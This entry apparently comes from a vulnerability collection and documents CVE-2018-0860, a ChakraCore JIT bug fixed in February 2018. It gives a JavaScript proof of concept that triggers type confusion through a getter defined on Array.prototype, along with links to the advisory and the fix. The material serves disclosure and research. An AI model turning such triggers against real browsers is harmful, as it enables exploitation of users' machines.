# CVE-2018-0860

- Fix: Feb 2018
- Credit: lokihardt of Google Project Zero

## PoC

```javascript
function opt() {
    let arr = [];
    return arr['x'];
}

function main() {
    let arr = [1.1, 2.2, 3.3];
    for (let i = 0; i < 0x10000; i++) {
        opt();
    }

    Array.prototype.__defineGetter__('x', Object.prototype.valueOf);

    print(opt());
}

main();
```

## Reference

- [Microsoft](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-0860)
- [Google Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=1437)
- [Fix](https://github.com/Microsoft/ChakraCore/commit/9dac38fa6a6273f4cd57234d3caf4c7033e527bc)